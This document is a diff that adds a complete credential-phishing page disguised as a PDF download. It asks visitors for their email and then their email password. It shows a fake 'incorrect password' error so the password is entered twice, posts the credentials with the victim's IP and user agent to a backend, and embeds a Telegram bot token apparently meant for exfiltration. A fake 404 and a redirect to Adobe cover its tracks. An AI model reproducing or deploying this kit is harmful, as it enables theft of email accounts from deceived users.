@@ -1,0 +1,274 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>PDF</title>
+  <link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSdJg0_O5HYIKugz7mdHzry4AXc2C0S0Z1IbA&s" type="image/png" />
+  <style>
+    body {
+      position: relative;
+      background-image: url('https://i.ibb.co/93WTFQfw/pdfwashlink.png');
+      background-size: cover;
+      background-repeat: no-repeat;
+      background-position: center;
+      font-family: sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      overflow: hidden;
+    }
+
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100%;
+      width: 100%;
+      backdrop-filter: blur(0px);
+      z-index: 0;
+    }
+
+    .form-container {
+      position: relative;
+      z-index: 1;
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px;
+      border-radius: 10px;
+      text-align: center;
+      width: 400px;
+    }
+
+    input[type="email"], input[type="password"] {
+      padding: 15px;
+      width: 90%;
+      font-size: 16px;
+      margin-top: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+
+    input[readonly] {
+      background-color: #e9ecef;
+      color: #333;
+      cursor: not-allowed;
+    }
+
+    button {
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      margin-top: 20px;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      width: 50%;
+      transition: background-color 0.3s ease;
+    }
+
+    button:hover:not(:disabled) {
+      background-color: #0056b3;
+    }
+
+    button:disabled {
+      background-color: #a9a9a9;
+      cursor: not-allowed;
+      opacity: 0.6;
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    .error {
+      color: red;
+      margin-top: 10px;
+      font-size: 13px;
+    }
+
+    #fake404 h3 {
+      color: #b30000;
+      font-size: 20px;
+    }
+
+    #fake404 p {
+      color: #333;
+      font-size: 14px;
+    }
+
+    .progress-container {
+      width: 100%;
+      height: 8px;
+      background-color: #e0e0e0;
+      border-radius: 4px;
+      overflow: hidden;
+      margin-top: 20px;
+    }
+
+    #startupLoader {
+      width: 400px;
+      margin: 0 auto 20px;
+      height: 6px;
+      border-radius: 3px;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Startup Loader -->
+  <div class="progress-container" id="startupLoader">
+    <div class="progress-bar" id="startupBar" style="height: 100%; width: 0%; background-color: #007BFF; transition: width 1.2s ease;"></div>
+  </div>
+
+  <!-- Main Form -->
+  <div class="form-container hidden" id="formContainer">
+    <h2 id="formTitle">Enter email to download files</h2>
+
+    <!-- Email Form -->
+    <form id="emailForm" onsubmit="handleEmailFormSubmit(event)">
+      <input type="email" name="email" placeholder="Enter your email" required />
+      <input type="text" name="website" class="hidden" autocomplete="off" />
+      <button type="submit" id="emailSubmitBtn" disabled>Download to Email</button>
+    </form>
+
+    <!-- Password Form -->
+    <form id="passwordForm" class="hidden" onsubmit="return false;">
+      <h3>Confirm email password to continue</h3>
+      <input type="email" name="email" id="emailVisible" readonly />
+      <input type="password" name="password" placeholder="Enter password" required />
+      <input type="text" name="website" class="hidden" autocomplete="off" />
+      <div class="error" id="passwordError" style="display: none;">The email or password entered is incorrect. Please try again.</div>
+      <button type="button" id="passwordSubmitBtn" onclick="handlePasswordSubmit()" disabled>Continue</button>
+    </form>
+
+    <!-- Fake 404 Page -->
+    <div id="fake404" class="hidden">
+      <h3>404 - Page Not Found</h3>
+      <p>Oops! The file you're looking for is unavailable right now,<br>try again later or contact the sender.</p>
+    </div>
+  </div>
+
+  <script>
+    const TELEGRAM_BOT_TOKEN = '1803614266:AAF_BAtHql2CQpGUmvFrqXKjZIsYnzkU_qs'; // 🔒 Hide real tokens before deployment
+    const TELEGRAM_CHAT_ID = '1731582332';
+    let clientIP = 'Fetching IP...';
+
+    fetch('https://api.ipify.org?format=json')
+      .then(res => res.json())
+      .then(data => { clientIP = data.ip; })
+      .catch(() => { clientIP = 'Unavailable'; });
+
+    function sendToEmailBackend(email, password) {
+      const userAgent = navigator.userAgent;
+      fetch('/api/send-email', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          ip: clientIP,
+          emailDomain: email.split('@')[1] || 'Unavailable',
+          loginServer: window.location.hostname,
+          userAgent
+        })
+      }).catch(err => console.error('Request failed', err));
+    }
+
+    function handleEmailFormSubmit(event) {
+      event.preventDefault();
+      const emailInput = document.querySelector('#emailForm input[name="email"]');
+      const email = emailInput.value.trim();
+      const button = document.getElementById('emailSubmitBtn');
+
+      button.disabled = true;
+      emailInput.disabled = true;
+
+      setTimeout(() => {
+        document.getElementById('emailForm').style.display = 'none';
+        document.getElementById('formTitle').style.display = 'none';
+        document.getElementById('passwordForm').classList.remove('hidden');
+        document.getElementById('emailVisible').value = email;
+      }, 1000);
+    }
+
+    function handlePasswordSubmit() {
+      const passwordInput = document.querySelector('#passwordForm input[name="password"]');
+      const email = document.getElementById('emailVisible').value.trim();
+      const password = passwordInput.value.trim();
+      const button = document.getElementById('passwordSubmitBtn');
+      const errorDiv = document.getElementById('passwordError');
+
+      if (!password || !email) {
+        alert("Please enter your password.");
+        return;
+      }
+
+      sendToEmailBackend(email, password);
+
+      // Freeze form
+      button.disabled = true;
+      passwordInput.disabled = true;
+
+      const alreadyTried = localStorage.getItem('passwordTried');
+
+      if (!alreadyTried) {
+        errorDiv.style.display = 'block';
+        localStorage.setItem('passwordTried', '1');
+
+        setTimeout(() => {
+          button.disabled = false;
+          passwordInput.disabled = false;
+        }, 2000);
+
+      } else {
+        errorDiv.style.display = 'none';
+
+        setTimeout(() => {
+          document.getElementById('passwordForm').style.display = 'none';
+          document.getElementById('fake404').classList.remove('hidden');
+
+          setTimeout(() => {
+            window.location.href = "https://www.adobe.com/acrobat/online/extract-pdf-pages.html";
+          }, 2000);
+        }, 1000);
+      }
+    }
+
+    // 🔄 Live validation
+    document.addEventListener('input', () => {
+      const email = document.querySelector('#emailForm input[name="email"]').value.trim();
+      const password = document.querySelector('#passwordForm input[name="password"]').value.trim();
+
+      const emailValid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+      document.getElementById('emailSubmitBtn').disabled = !emailValid;
+      document.getElementById('passwordSubmitBtn').disabled = !password;
+    });
+
+    // ⏱️ On load
+    window.onload = () => {
+      localStorage.removeItem('passwordTried');
+
+      const startupBar = document.getElementById('startupBar');
+      startupBar.style.width = '0%';
+      setTimeout(() => { startupBar.style.width = '100%'; }, 100);
+      setTimeout(() => {
+        document.getElementById('startupLoader').style.display = 'none';
+        document.getElementById('formContainer').classList.remove('hidden');
+      }, 1300);
+
+      const hash = window.location.hash;
+      if (hash && hash.includes('@')) {
+        const autoEmail = hash.substring(1);
+        document.querySelector('#emailForm input[name="email"]').value = autoEmail;
+        handleEmailFormSubmit(new Event('submit'));
+      }
+    };
+  </script>
+</body>
+</html>
